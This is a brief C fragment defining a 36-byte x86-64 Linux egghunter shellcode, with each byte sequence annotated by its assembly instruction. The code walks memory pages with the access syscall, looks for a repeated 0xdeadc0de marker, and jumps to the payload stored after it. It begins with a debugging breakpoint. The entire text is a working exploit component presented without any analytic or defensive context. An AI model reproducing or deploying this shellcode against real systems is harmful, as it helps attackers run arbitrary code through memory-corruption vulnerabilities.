
#define EGG_SIZE 36

char EGG[] = {
  /* 0000 */ "\xcc"                 /* int3                */
  /* 0001 */ "\x31\xff"             /* xor edi, edi        */
  /* 0003 */ "\xf7\xe7"             /* mul edi             */
  /* 0005 */ "\x96"                 /* xchg esi, eax       */
  /* 0006 */ "\xb6\x10"             /* mov dh, 0x10        */
  /* 0008 */ "\x48\x01\xd7"         /* add rdi, rdx        */
  /* 000B */ "\x57"                 /* push rdi            */
  /* 000C */ "\xaf"                 /* scasd               */
  /* 000D */ "\x6a\x15"             /* push 0x15           */
  /* 000F */ "\x58"                 /* pop rax             */
  /* 0010 */ "\x0f\x05"             /* syscall             */
  /* 0012 */ "\x5f"                 /* pop rdi             */
  /* 0013 */ "\x85\xc0"             /* test eax, eax       */
  /* 0015 */ "\x75\xf1"             /* jnz 0x8             */
  /* 0017 */ "\xb8\xde\xc0\xad\xde" /* mov eax, 0xdeadc0de */
  /* 001C */ "\xaf"                 /* scasd               */
  /* 001D */ "\x75\xec"             /* jnz 0xb             */
  /* 001F */ "\xaf"                 /* scasd               */
  /* 0020 */ "\x75\xe9"             /* jnz 0xb             */
  /* 0022 */ "\xff\xe7"             /* jmp rdi             */
};